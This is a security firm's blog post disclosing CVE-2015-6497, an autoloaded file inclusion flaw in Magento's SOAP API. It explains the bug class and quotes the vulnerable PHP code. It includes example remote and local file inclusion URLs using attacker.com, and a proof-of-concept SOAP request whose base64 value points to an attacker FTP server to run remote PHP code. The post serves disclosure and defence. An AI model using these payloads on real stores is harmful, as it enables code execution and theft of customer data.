  + [Testing](https://mindedsecurity.com/our-services/testing/ "Testing")
    - [Manual Secure Code Review](https://mindedsecurity.com/services/testing/manual-secure-code-review/ "Manual Secure Code Review")
    - [Manual WAPT](https://mindedsecurity.com/services/testing/manual-wapt/ "Manual WAPT")
    - [Cloud Security Testing](https://mindedsecurity.com/services/testing/cloud-security-testing/ "Cloud Security Testing")
    - [IoT Security](https://mindedsecurity.com/services/testing/iot-security/ "IoT Security")
    - [API Security](https://mindedsecurity.com/services/testing/api-security/ "API Security")
    - [Mobile Security Assessment](https://mindedsecurity.com/services/testing/mobile-security-assessment/ "Mobile Security Assessment")
    - [Client Side Assessment](https://mindedsecurity.com/services/testing/client-side-assessment/ "Client Side Assessment")
  + [Consulting](https://mindedsecurity.com/our-services/consulting/ "Consulting")
    - [Software Security Advisory](https://mindedsecurity.com/services/consulting/software-security-advisory/ "Software Security Advisory")
    - [5D Framework](https://mindedsecurity.com/services/consulting/5d-framework/ "5D Framework")
    - [Threat Modeling](https://mindedsecurity.com/services/consulting/threat-modeling/ "Threat Modeling")
    - [Secure Design](https://mindedsecurity.com/services/consulting/secure-design/ "Secure Design")
    - [Secure Architecture Review](https://mindedsecurity.com/services/consulting/secure-architecture-review/ "Secure Architecture Review")
    - [Secure Coding Guidelines](https://mindedsecurity.com/services/consulting/secure-coding-guidelines/ "Secure Coding Guidelines")
    - [Fixing Support](https://mindedsecurity.com/services/consulting/fixing-support/ "Fixing Support")
    - [Outsourcing Development Governance](https://mindedsecurity.com/services/consulting/outsourcing-development-governance/ "Outsourcing Development Governance")
  + [Request a brochure](https://mindedsecurity.com/request-a-brochure/ "Request a brochure")
* Resources
  + [Blog](https://blog.mindedsecurity.com/ "Blog")
  + [News](https://mindedsecurity.com/category/news/ "News")
  + [Videos](https://mindedsecurity.com/videos/ "Videos")
  + [Research](https://mindedsecurity.com/research/ "Research")
  + [Advisories](https://mindedsecurity.com/research/advisories/ "Advisories")
* [About us](https://mindedsecurity.com/our-mission/ "About us")
  + [The Company](https://mindedsecurity.com/the-company/ "The Company")
  + [Contact us](https://mindedsecurity.com/contact-us/ "Contact us")
  + [Newsletter](https://mindedsecurity.com/newsletter/ "Newsletter")
  + [Jobs](https://mindedsecurity.com/jobs/ "Jobs")
  + [Privacy Policy](https://mindedsecurity.com/privacy-policy/ "Privacy Policy")

## IMQ Minded Security Blog

[skip to main](#main)  |
[skip to sidebar](#sidebar)

## Friday, September 11, 2015

# Autoloaded File Inclusion in Magento SOAP API (SUPEE-6482)

This past February we reported an interesting and quite overlooked kind of vulnerability in the [Magento](http://magento.com/) web e-commerce platform. The vulnerability might allow an authenticated attacker to execute arbitrary code on the affected web stores, and this can lead to a complete compromise, including credit card information and personal data theft. We received the first reply from the Magento Security Team on June 22, 2015, stating that our submission was not eligible for the bug bounty program, because it was found to be invalid and not actionable. The reason for the rejection was that there are too many requirements to exploit the vulnerability, first of all it requires that Magento is running on outdated PHP versions, because this kind of vulnerability has been fixed in the PHP core engine at the beginning of 2014. However, as we will see in this post, there are still many websites out there using such outdated PHP versions. That should be one of the reasons why the Magento Security Team replied us on June 25, 2015, stating the following:
> *We were able to confirm your issue. Even though it requires knowing API credentials, it should not be possible to execute such actions. The PHP versions that are additionally vulnerable, while old are still used in popular distributions like RHEL 7.1.* *We will schedule fixing this issue for our next product release given lower priority. We will inform you regarding possible awards associated with this report.*

On August 4, 2015, a bundle of patches ([SUPEE-6482](http://magento.com/security/patches/supee-6482)) has been released by the Magento team, that resolved several security-related issues, including the one we reported in February. The same day Magento released new versions (Community Edition 1.9.2.1 and Enterprise Edition 1.14.2.1) that include SUPEE-6482 along with other security patches. On August 13, 2015, we requested a new CVE identifier for this vulnerability, and MITRE has assigned the name [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497) for it.

### **What is an "Autoloaded File Inclusion" vulnerability?**

This kind of vulnerability might affect PHP applications which uses an "exploitable" autoloading mechanism. The "[Autoloading Classes](http://php.net/manual/en/language.oop5.autoload.php)" feature has been introduced in PHP 5.0 with the magic function *\_\_autoload()* which is automatically called when your code references a class or interface that hasn’t been loaded yet. So, instead of including every needed class by hand, is it possible to register a function that gets called as soon as the code try to instantiate an unknown class. This function gets passed the unknown class name and is responsible for including the right file that contains the class definition. As an aside, starting from PHP 5.1.2 autoload-functions are usually registered via [*spl\_autoload\_register()*](http://php.net/manual/en/function.spl-autoload-register.php), which provides a more flexible alternative for autoloading classes. For this reason, using *\_\_autoload()* is discouraged and may be deprecated in the future. Here’s an example of an extremely basic *\_\_autoload()* implementation, which attempts to load the classes MyClass1 and MyClass2 from the files MyClass1.php and MyClass2.php respectively (it's taken from the official PHP documentation page):

```
<?php

 function __autoload($class_name) {
    include $class_name . '.php';
 }

 $obj  = new MyClass1();
 $obj2 = new MyClass2();

?>
```

While this feature is extremely useful and powerful, it might introduce potential local/remote file inclusion vulnerabilities when user-controlled input is used as a class name. Indeed, if an attacker can control the class name variable passed to an autoloading function, she could try to play around with it in order to include an arbitrary file and execute PHP code remotely. There are multiple ways to trigger the autoloader, the most obvious is class instantiation using the ***new*** operator. In addition to that, there are some PHP functions which can be considered as *sensitive sinks* for this kind of vulnerability. Here is an incomplete list:

* [class\_exists()](http://php.net/manual/en/function.class-exists.php)
* [interface\_exists()](http://php.net/manual/en/function.interface-exists.php)
* [method\_exists()](http://php.net/manual/en/function.method-exists.php)
* [property\_exists()](http://php.net/manual/en/function.property-exists.php)
* [is\_subclass\_of()](http://php.net/manual/en/function.is-subclass-of.php)
* ...

So, when user-controlled input (*tainted data*) enters one of these *sensitive sinks* there's a chance for the application to be vulnerable to "Autoloaded File Inclusion". Let's see a trivial example of vulnerable scripts:

```
<?php

 /* File: autoload.php */

 function __autoload($class_name) {
    include $class_name . '.php';
 }

?>
```

```
<?php

 /* File: vuln.php */

 require('autoload.php');

 if(isset($_GET['class']) && class_exists($_GET['class'])) {
    $obj = new $_GET['class'];
 } else {
    die('No class found');
 }

 /* Some code... */

?>
```

In this example an attacker controls a class name via the GET parameter "class", which is first used with the *class\_exists()* function (triggering the autoloader in case it is an unknown class) and then to instantiate a new object. This means that the attacker can control the *$class\_name* variable passed to the autoloader, therefore it could be possible to include arbitrary files from both local or remote resources by invoking URLs like these:

> **http://example.com/vuln.php?class=http://attacker.com/shell**
>
> **http://example.com/vuln.php?class=../../../tmp/cache/attacker\_controlled/file**

In the first case the autoloader will try to include and execute the PHP code located at *http://attacker.com/shell.php*, resulting in a Remote File Inclusion (RFI); while in the second case the autoloader will try to include and execute the PHP code located into the file */tmp/cache/attacker\_controlled/file.php*, resulting in a Local File Inclusion (LFI). Furthermore, in cases like this where the attacker controls the classname's prefix, in addition to http:// other [PHP wrappers](http://php.net/manual/en/wrappers.php) might be abused in order to execute arbitrary PHP code.

But... wait a moment! According to the [official documentation](http://php.net/manual/en/language.oop5.basic.php) *"a valid class name starts with a letter or underscore, followed by any number of letters, numbers, or underscores".* That means an attacker cannot include arbitrary files via class names because it should not be possible to e.g. use path traversal sequences (../../) through them. But here comes the problem: there was a [bug](https://bugs.php.net/bug.php?id=62789) in the PHP core which allowed to invoke class autoloaders with invalid class names. This bug has been solved in [January 2014](http://www.php.net/ChangeLog-5.php#5.4.24) with the release of PHP versions 5.4.24 and 5.5.8.

### **How many vulnerable PHP installs are out there?**

Well, the bug which might enable this kind of vulnerability has been fixed by the PHP team at the beginning of 2014. But is this enough to say this kind of vulnerability should not pose any security concern? Maybe not... At the end of 2014 has been published a [blog post](http://blog.ircmaxell.com/2014/12/php-install-statistics.html) showing that 78% of all PHP installs were not secure, meaning they had at least one known security vulnerability. Antony Ferrara, the author of that post, used the statistics data from [W3Techs](http://w3techs.com/) in order to come to that conclusion. Let's try to do the same with regards to the PHP installs affected by the autoloading bug. In other words, let's check how many PHP websites are using PHP versions before 5.4.24 or 5.5.8.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s400/php5.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3EM7BJaEsfNVf5ER6me7RRHTJv_OcYNGxTPNSy9eSz_sK4Q2k0BVlc5IHcUnCTR7s5uDsUtPLERaajRpFqJenNa_HItbVojHmAEMQH9Qk-4-Bfq7oyk3D3_0sM2LnGpQP3i-TxQBeteY/s1600/php5.png)

The above table has been retrieved from the [PHP version 5](http://w3techs.com/technologies/details/pl-php/5/all) usage statistics page from W3Techs, as of September 10, 2015. It shows that at least **54.2%** of websites using PHP are affected by the autoloading bug (38.5% is using PHP 5.3, 14.7% is using PHP 5.2 and 1% is using PHP 5.1). Next step is to see how many websites are using vulnerable PHP 5.4.x and 5.5.x versions. The usage statistics page for [subversions of PHP 5.4](http://w3techs.com/technologies/details/pl-php/5.4/all) show that **12.7%** of websites using PHP are running a version before 5.4.24, while the usage statistics page for [subversions of PHP 5.5](http://w3techs.com/technologies/details/pl-php/5.5/all) show that **3.5%** of websites using PHP are running a version before 5.5.8. Overall, this means that **70.4%** of websites using PHP are affected by the autoloading bug. Roughly speaking, considering that according to the official website Magento powers more than 240,000 online shops, this could mean that over 150,000 websites powered by Magento might be affected by [CVE-2015-6497](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-6497).

###

### **Technical description of the****vulnerability**

The vulnerability is caused by the *Mage\_Catalog\_Model\_Product\_Api\_V2::create()* method, which handles the "[catalogProductCreate](http://devdocs.magento.com/guides/m1x/api/soap/catalog/catalogProduct/catalog_product.create.html)" SOAP API call. The vulnerable code is located into the /app/code/core/Mage/Catalog/Model/Product/Api/V2.php script:

```
    public function create($type, $set, $sku, $productData, $store = null)
    {
        if (!$type || !$set || !$sku) {
            $this->_fault('data_invalid');
        }

        $this->_checkProductTypeExists($type);
        $this->_checkProductAttributeSet($set);

        /** @var $product Mage_Catalog_Model_Product */
        $product = Mage::getModel('catalog/product');
        $product->setStoreId($this->_getStoreId($store))
            ->setAttributeSetId($set)
            ->setTypeId($type)
            ->setSku($sku);

        if (!property_exists($productData, 'stock_data')) {
            //Set default stock_data if not exist in product data
            $_stockData = array('use_config_manage_stock' => 0);
            $product->setStockData($_stockData);
        }

```

This method expects the $productData parameter to be an array (in form of a stdClass object) and uses the *property\_exists()* function with it. However, an attacker can manipulate a SOAP request arbitrarily and send the $productData parameter in form of a string. In this case, if the string passed to the *property\_exists()* function is an unknown class, any registered autloader function will be triggered. When the *property\_exists()* function is called there's only one autoloader function registered, that is the *Varien\_Autoload::autoload()* method:

```
    public function autoload($class)
    {
        if ($this->_collectClasses) {
            $this->_arrLoadedClasses[self::$_scope][] = $class;
        }
        if ($this->_isIncludePathDefined) {
            $classFile =  COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . $class;
        } else {
            $classFile = str_replace(' ', DIRECTORY_SEPARATOR, ucwords(str_replace('_', ' ', $class)));
        }
        $classFile.= '.php';
        //echo $classFile;die();
        return include $classFile;
    }

```

In such a scenario, the $class parameter automatically passed to this method is exactly the same string value sent through the $productData parameter from the SOAP request, which after some replacementes and a ".php" string appended to it, is being used in a call to the *[include()](http://php.net/manual/it/function.include.php)* function. This may result in an arbitrary file inclusion (both from local or remote resources) and could be exploited to include and execute arbitrary PHP code. There are some conditions which should be met in order to exploit this vulnerability:

* an API user account with privileges to create a catalog product is required;
* in order to include arbitrary files from remote locations, Magento should run on PHP before
  5.4.24 or 5.5.8, because such versions have fixed the issue related to invalid class names
  in the autoloading process;
* in order to include arbitrary files from remote locations the "allow\_url\_include" directive
  must be set to On;
* in case the allow\_url\_include directive is set to Off it might still be possible to include
  files from remote locations using the ssh2.sftp:// wrapper (which requires the SSH2 extension
  to be installed) or execute arbitrary OS commands leveraging the expect:// wrapper (which
  requires the Expect extension to be installed).

NOTE: if Magento is running on PHP version after 5.4.23 or 5.5.7 the vulnerability
could still be exploited by including a local file with a .php extension (something like /tmp/test.php).
If Magento is running on PHP before 5.3.4 the vulnerability could be exploited to include arbitrary
local files with any extension (e.g. a session file containing malicious PHP code injected by the
attacker) because NULL bytes are allowed within the path (see [CVE-2006-7243](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-7243)).

### **Proof of Concept**

Once logged in with valid API credentials, an attacker could send a SOAP request like the following in order to try to exploit the vulnerability:
> POST /magento/index.php/api/v2\_soap HTTP/1.0
>
> Host: localhost
>
> Content-Length: 804
>
> Connection: close
>
>
>
> <?xml version="1.0" encoding="UTF-8"?>
>
> <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:Magento" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
>
> <SOAP-ENV:Body>
>
> <ns1:catalogProductCreate>
>
> <sessionId xsi:type="xsd:string">VALID\_SESSION</sessionId>
>
> <type xsi:type="xsd:string">simple</type>
>
> <set xsi:type="xsd:string">4</set>
>
> <sku xsi:type="xsd:string">test</sku>
>
> <productData xsi:type="xsd:base64Binary">ZnRwOi8vYXR0YWNrZXI6cGFzc3dvcmRAYXR0YWNrZXJfc2VydmVyLmNvbS9ob21lL2F0dGFja2VyL2V2aWw=</productData>
>
> <storeView xsi:nil="true"/>
>
> </ns1:catalogProductCreate>
>
> </SOAP-ENV:Body>
>
> </SOAP-ENV:Envelope>

The  "productData" parameter has been encoded in base64 within the SOAP request, and the decoded string is the following:

> **ftp://attacker:password@attacker\_server.com/home/attacker/evil**

This means that leveraging the [ftp:// wrapper](http://php.net/manual/en/wrappers.ftp.php), an attacker might be able to force Magento to load and execute malicious code from a FTP server under its control. In this example, the attacker only has to put the malicious code under /home/attacker/evil.php. However, as we said before, other PHP wrappers might be abused, potentially leading to direct arbitrary PHP code execution.

By

[Egidio Romano](https://www.blogger.com/profile/14760841123995860416 "author profile")

at

[12:32 AM](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html "permanent link")

[![](//img2.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=7122745763234660283&postID=8106901234847721037&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=email "Email This")
[BlogThis!](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=blog "BlogThis!")
[Share to X](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=twitter "Share to X")
[Share to Facebook](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=facebook "Share to Facebook")
[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=7122745763234660283&postID=8106901234847721037&target=pinterest "Share to Pinterest")

Labels:
[Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
,
[Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
,
[CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
,
[Magento](https://blog.mindedsecurity.com/search/label/Magento)
,
[Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)

#### 3 comments :

1. ![](//resources.blogblog.com/img/blank.gif)[Francis Kim](https://franciskim.co)[September 26, 2015 at 6:57 AM](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html?showComment=1443275868075#c1028492859057432100)

   Thank you for posting this up - the proof of concept have helped me out a lot.

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=7122745763234660283&postID=1028492859057432100)Replies
   Reply
2. ![](//resources.blogblog.com/img/blank.gif)[anabolika](http://steroidkaufen.com/)[January 1, 2016 at 11:14 AM](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html?showComment=1451675694324#c1342790937421587562)

   I’ve just tried this out and it looks fantastic!

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=7122745763234660283&postID=1342790937421587562)Replies
   Reply
3. ![](//resources.blogblog.com/img/blank.gif)[Ven Hudson](http://www.knowband.com/)[October 18, 2016 at 4:27 AM](https://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html?showComment=1476790068727#c1719358890820613650)

   Working. Thanks :)

   Reply[Delete](https://www.blogger.com/delete-comment.g?blogID=7122745763234660283&postID=1719358890820613650)Replies
   Reply

Add commentLoad more...

[Newer Post](https://blog.mindedsecurity.com/2015/10/advanced-js-deobfuscation-via-ast-and.html "Newer Post")

[Older Post](https://blog.mindedsecurity.com/2015/08/pdf-based-polyglots-through-svg-images.html "Older Post")

[Home](https://blog.mindedsecurity.com/)

Subscribe to:
[Post Comments
(
Atom
)](https://blog.mindedsecurity.com/feeds/8106901234847721037/comments/default)

##

## Labels

* [3rd party javascript](https://blog.mindedsecurity.com/search/label/3rd%20party%20javascript)
  (
  2
  )
* [absolute path check](https://blog.mindedsecurity.com/search/label/absolute%20path%20check)
  (
  1
  )
* [Adobe](https://blog.mindedsecurity.com/search/label/Adobe)
  (
  3
  )
* [Advisory](https://blog.mindedsecurity.com/search/label/Advisory)
  (
  5
  )
* [adware](https://blog.mindedsecurity.com/search/label/adware)
  (
  1
  )
* [AFNetworking](https://blog.mindedsecurity.com/search/label/AFNetworking)
  (
  1
  )
* [agile](https://blog.mindedsecurity.com/search/label/agile)
  (
  1
  )
* [AMT](https://blog.mindedsecurity.com/search/label/AMT)
  (
  1
  )
* [Android](https://blog.mindedsecurity.com/search/label/Android)
  (
  1
  )
* [Android Security](https://blog.mindedsecurity.com/search/label/Android%20Security)
  (
  6
  )
* [Anti-Tampering](https://blog.mindedsecurity.com/search/label/Anti-Tampering)
  (
  2
  )
* [Antitamper](https://blog.mindedsecurity.com/search/label/Antitamper)
  (
  2
  )
* [Applet Security](https://blog.mindedsecurity.com/search/label/Applet%20Security)
  (
  6
  )
* [Application Security](https://blog.mindedsecurity.com/search/label/Application%20Security)
  (
  23
  )
* [appsec](https://blog.mindedsecurity.com/search/label/appsec)
  (
  1
  )
* [Arbitrary Code Execution](https://blog.mindedsecurity.com/search/label/Arbitrary%20Code%20Execution)
  (
  4
  )
* [architecture](https://blog.mindedsecurity.com/search/label/architecture)
  (
  1
  )
* [asp.net](https://blog.mindedsecurity.com/search/label/asp.net)
  (
  2
  )
* [ast](https://blog.mindedsecurity.com/search/label/ast)
  (
  1
  )
* [attacks](https://blog.mindedsecurity.com/search/label/attacks)
  (
  1
  )
* [Authentication](https://blog.mindedsecurity.com/search/label/Authentication)
  (
  1
  )
* [Autoloaded File Inclusion](https://blog.mindedsecurity.com/search/label/Autoloaded%20File%20Inclusion)
  (
  1
  )
* [Automotive](https://blog.mindedsecurity.com/search/label/Automotive)
  (
  1
  )
* [Banking](https://blog.mindedsecurity.com/search/label/Banking)
  (
  4
  )
* [Banking Malware](https://blog.mindedsecurity.com/search/label/Banking%20Malware)
  (
  1
  )
* [blackbox](https://blog.mindedsecurity.com/search/label/blackbox)
  (
  1
  )
* [blueclosure](https://blog.mindedsecurity.com/search/label/blueclosure)
  (
  1
  )
* [burp](https://blog.mindedsecurity.com/search/label/burp)
  (
  1
  )
* [canonicalization](https://blog.mindedsecurity.com/search/label/canonicalization)
  (
  1
  )
* [Certificate Pinning](https://blog.mindedsecurity.com/search/label/Certificate%20Pinning)
  (
  1
  )
* [chat](https://blog.mindedsecurity.com/search/label/chat)
  (
  1
  )
* [Client Side HTTP Parameter Pollution](https://blog.mindedsecurity.com/search/label/Client%20Side%20HTTP%20Parameter%20Pollution)
  (
  1
  )
* [cloud](https://blog.mindedsecurity.com/search/label/cloud)
  (
  1
  )
* [cloud browsing](https://blog.mindedsecurity.com/search/label/cloud%20browsing)
  (
  1
  )
* [Code Protection](https://blog.mindedsecurity.com/search/label/Code%20Protection)
  (
  2
  )
* [compliance](https://blog.mindedsecurity.com/search/label/compliance)
  (
  1
  )
* [Concrete5](https://blog.mindedsecurity.com/search/label/Concrete5)
  (
  1
  )
* [Content Security Policy](https://blog.mindedsecurity.com/search/label/Content%20Security%20Policy)
  (
  1
  )
* [CORS](https://blog.mindedsecurity.com/search/label/CORS)
  (
  1
  )
* [Cross Site Scripting](https://blog.mindedsecurity.com/search/label/Cross%20Site%20Scripting)
  (
  7
  )
* [CVE-2015-6497](https://blog.mindedsecurity.com/search/label/CVE-2015-6497)
  (
  1
  )
* [CVE-2021-44228](https://blog.mindedsecurity.com/search/label/CVE-2021-44228)
  (
  1
  )
* [DAB](https://blog.mindedsecurity.com/search/label/DAB)
  (
  1
  )
* [defense](https://blog.mindedsecurity.com/search/label/defense)
  (
  1
  )
* [deobfuscation](https://blog.mindedsecurity.com/search/label/deobfuscation)
  (
  2
  )
* [DeviceSecurity](https://blog.mindedsecurity.com/search/label/DeviceSecurity)
  (
  2
  )
* [DEVSECOPS](https://blog.mindedsecurity.com/search/label/DEVSECOPS)
  (
  1
  )
* [dll](https://blog.mindedsecurity.com/search/label/dll)
  (
  1
  )
* [DNS Rebinding](https://blog.mindedsecurity.com/search/label/DNS%20Rebinding)
  (
  2
  )
* [DOM Based XSS](https://blog.mindedsecurity.com/search/label/DOM%20Based%20XSS)
  (
  9
  )
* [Dom Xss](https://blog.mindedsecurity.com/search/label/Dom%20Xss)
  (
  15
  )
* [DOMinator](https://blog.mindedsecurity.com/search/label/DOMinator)
  (
  11
  )
* [DOMinatorPro](https://blog.mindedsecurity.com/search/label/DOMinatorPro)
  (
  9
  )
* [download](https://blog.mindedsecurity.com/search/label/download)
  (
  1
  )
* [Dyre](https://blog.mindedsecurity.com/search/label/Dyre)
  (
  1
  )
* [Encryption](https://blog.mindedsecurity.com/search/label/Encryption)
  (
  3
  )
* [Expression Language Injection](https://blog.mindedsecurity.com/search/label/Expression%20Language%20Injection)
  (
  3
  )
* [fixing](https://blog.mindedsecurity.com/search/label/fixing)
  (
  1
  )
* [Flex](https://blog.mindedsecurity.com/search/label/Flex)
  (
  2
  )
* [Flutter](https://blog.mindedsecurity.com/search/label/Flutter)
  (
  1
  )
* [gameover](https://blog.mindedsecurity.com/search/label/gameover)
  (
  1
  )
* [Google Plus One](https://blog.mindedsecurity.com/search/label/Google%20Plus%20One)
  (
  1
  )
* [google security](https://blog.mindedsecurity.com/search/label/google%20security)
  (
  1
  )
* [Http Parameter Pollution](https://blog.mindedsecurity.com/search/label/Http%20Parameter%20Pollution)
  (
  2
  )
* [Http Request Splitting](https://blog.mindedsecurity.com/search/label/Http%20Request%20Splitting)
  (
  1
  )
* [Information Disclosure](https://blog.mindedsecurity.com/search/label/Information%20Disclosure)
  (
  2
  )
* [innovation](https://blog.mindedsecurity.com/search/label/innovation)
  (
  2
  )
* [intruder](https://blog.mindedsecurity.com/search/label/intruder)
  (
  1
  )
* [iOS](https://blog.mindedsecurity.com/search/label/iOS)
  (
  2
  )
* [iOS Security](https://blog.mindedsecurity.com/search/label/iOS%20Security)
  (
  7
  )
* [IoT](https://blog.mindedsecurity.com/search/label/IoT)
  (
  2
  )
* [ISO21434](https://blog.mindedsecurity.com/search/label/ISO21434)
  (
  1
  )
* [J2EE](https://blog.mindedsecurity.com/search/label/J2EE)
  (
  1
  )
* [Java](https://blog.mindedsecurity.com/search/label/Java)
  (
  5
  )
* [Java Faces](https://blog.mindedsecurity.com/search/label/Java%20Faces)
  (
  1
  )
* [Java Security](https://blog.mindedsecurity.com/search/label/Java%20Security)
  (
  2
  )
* [javascript](https://blog.mindedsecurity.com/search/label/javascript)
  (
  4
  )
* [JavaScript Security](https://blog.mindedsecurity.com/search/label/JavaScript%20Security)
  (
  2
  )
* [JNLP Security](https://blog.mindedsecurity.com/search/label/JNLP%20Security)
  (
  1
  )
* [jQuery](https://blog.mindedsecurity.com/search/label/jQuery)
  (
  2
  )
* [JSON](https://blog.mindedsecurity.com/search/label/JSON)
  (
  1
  )
* [Libraries Security](https://blog.mindedsecurity.com/search/label/Libraries%20Security)
  (
  1
  )
* [Liferay](https://blog.mindedsecurity.com/search/label/Liferay)
  (
  1
  )
* [Linkedin.com](https://blog.mindedsecurity.com/search/label/Linkedin.com)
  (
  1
  )
* [Log4J](https://blog.mindedsecurity.com/search/label/Log4J)
  (
  1
  )
* [Magento](https://blog.mindedsecurity.com/search/label/Magento)
  (
  1
  )
* [malware](https://blog.mindedsecurity.com/search/label/malware)
  (
  9
  )
* [malware detector](https://blog.mindedsecurity.com/search/label/malware%20detector)
  (
  1
  )
* [MAPT](https://blog.mindedsecurity.com/search/label/MAPT)
  (
  4
  )
* [maxthon](https://blog.mindedsecurity.com/search/label/maxthon)
  (
  1
  )
* [microservices](https://blog.mindedsecurity.com/search/label/microservices)
  (
  1
  )
* [MitM](https://blog.mindedsecurity.com/search/label/MitM)
  (
  2
  )
* [Mobile](https://blog.mindedsecurity.com/search/label/Mobile)
  (
  5
  )
* [Mobile Security](https://blog.mindedsecurity.com/search/label/Mobile%20Security)
  (
  4
  )
* [MSTG](https://blog.mindedsecurity.com/search/label/MSTG)
  (
  3
  )
* [mvc](https://blog.mindedsecurity.com/search/label/mvc)
  (
  1
  )
* [Obfuscation](https://blog.mindedsecurity.com/search/label/Obfuscation)
  (
  3
  )
* [Omniture](https://blog.mindedsecurity.com/search/label/Omniture)
  (
  2
  )
* [Oracle NetBeans](https://blog.mindedsecurity.com/search/label/Oracle%20NetBeans)
  (
  1
  )
* [OWASP](https://blog.mindedsecurity.com/search/label/OWASP)
  (
  6
  )
* [OWASP 5D](https://blog.mindedsecurity.com/search/label/OWASP%205D)
  (
  2
  )
* [OWASP SAMM](https://blog.mindedsecurity.com/search/label/OWASP%20SAMM)
  (
  2
  )
* [OWASP Summit](https://blog.mindedsecurity.com/search/label/OWASP%20Summit)
  (
  1
  )
* [OWASP Top Ten](https://blog.mindedsecurity.com/search/label/OWASP%20Top%20Ten)
  (
  3
  )
* [p2p encryption](https://blog.mindedsecurity.com/search/label/p2p%20encryption)
  (
  1
  )
* [path traversal](https://blog.mindedsecurity.com/search/label/path%20traversal)
  (
  3
  )
* [peer to peer encryption](https://blog.mindedsecurity.com/search/label/peer%20to%20peer%20encryption)
  (
  1
  )
* [Polyglots](https://blog.mindedsecurity.com/search/label/Polyglots)
  (
  1
  )
* [Primefaces](https://blog.mindedsecurity.com/search/label/Primefaces)
  (
  1
  )
* [privacy](https://blog.mindedsecurity.com/search/label/privacy)
  (
  1
  )
* [puffin](https://blog.mindedsecurity.com/search/label/puffin)
  (
  1
  )
* [RAT](https://blog.mindedsecurity.com/search/label/RAT)
  (
  1
  )
* [RAT WARS](https://blog.mindedsecurity.com/search/label/RAT%20WARS)
  (
  1
  )
* [RATDET](https://blog.mindedsecurity.com/search/label/RATDET)
  (
  1
  )
* [RATWARS](https://blog.mindedsecurity.com/search/label/RATWARS)
  (
  1
  )
* [RDS](https://blog.mindedsecurity.com/search/label/RDS)
  (
  1
  )
* [Remote Code Execution](https://blog.mindedsecurity.com/search/label/Remote%20Code%20Execution)
  (
  3
  )
* [remote working](https://blog.mindedsecurity.com/search/label/remote%20working)
  (
  1
  )
* [reverse engineering](https://blog.mindedsecurity.com/search/label/reverse%20engineering)
  (
  1
  )
* [Same Origin Policy](https://blog.mindedsecurity.com/search/label/Same%20Origin%20Policy)
  (
  1
  )
* [sanitization](https://blog.mindedsecurity.com/search/label/sanitization)
  (
  1
  )
* [sast](https://blog.mindedsecurity.com/search/label/sast)
  (
  3
  )
* [Screen Control](https://blog.mindedsecurity.com/search/label/Screen%20Control)
  (
  1
  )
* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
